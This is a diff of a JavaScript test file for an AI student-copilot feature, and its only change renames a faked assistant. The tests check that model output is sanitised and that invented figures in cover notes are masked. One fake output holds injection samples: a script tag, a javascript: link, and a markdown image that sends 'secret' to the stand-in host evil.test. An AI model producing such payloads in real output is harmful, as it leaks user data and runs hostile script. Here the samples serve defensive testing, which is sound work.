@@ -247,14 +247,14 @@ describe('A. student copilot', () => {
   });
   it('strips markup and markdown images from model output', async () => {
     const s = await student();
-    fake.overrides['Placement OS assistant'] = () => 'Hi <script>alert(1)</script><b>there</b> ![x](https://evil.test/p.png?d=secret) [click](javascript:alert(1))';
+    fake.overrides['UpGrid assistant'] = () => 'Hi <script>alert(1)</script><b>there</b> ![x](https://evil.test/p.png?d=secret) [click](javascript:alert(1))';
     const r = await chat(s, { message: 'hello' });
     expect(r.body.message.content).toBe('Hi there  click');
   });
   it('cover notes are labelled drafts and invented numbers are masked', async () => {
     const o = await officer(); const d = await createOpenDrive(app, o);
     const s = await student();
-    fake.overrides['Placement OS assistant'] = () => 'Dear team, I led a team of 40 and increased sales by 300% using React.';
+    fake.overrides['UpGrid assistant'] = () => 'Dear team, I led a team of 40 and increased sales by 300% using React.';
     const r = await chat(s, { message: 'Write a cover note', driveId: d.id });
     expect(r.body.message.draft).toBe(true);
     expect(r.body.message.content.startsWith('DRAFT — review and edit before you use this.')).toBe(true);
